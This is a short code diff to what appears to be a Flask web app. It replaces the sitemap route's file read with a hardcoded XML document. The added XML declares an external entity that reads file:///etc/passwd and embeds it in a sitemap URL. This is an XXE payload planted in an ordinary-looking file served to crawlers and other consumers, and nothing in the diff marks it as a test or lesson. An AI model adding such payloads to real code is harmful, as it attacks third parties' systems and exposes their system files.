@@ -17,7 +17,16 @@ def about():
 
 @app.route("/sitemap.xml")
 def sitemap():
-    file_path = os.path.join(os.path.dirname(__file__), "sitemap.xml")
-    with open(file_path, "r", encoding="utf-8") as f:
-        xml_content = f.read()
+    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE urlset [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  <url>
+    <loc>https://example.com/?abc=&xxe;</loc>
+    <lastmod>2025-07-30</lastmod>
+    <changefreq>daily</changefreq>
+    <priority>1.0</priority>
+  </url>
+</urlset>"""
     return Response(xml_content, mimetype="application/xml")
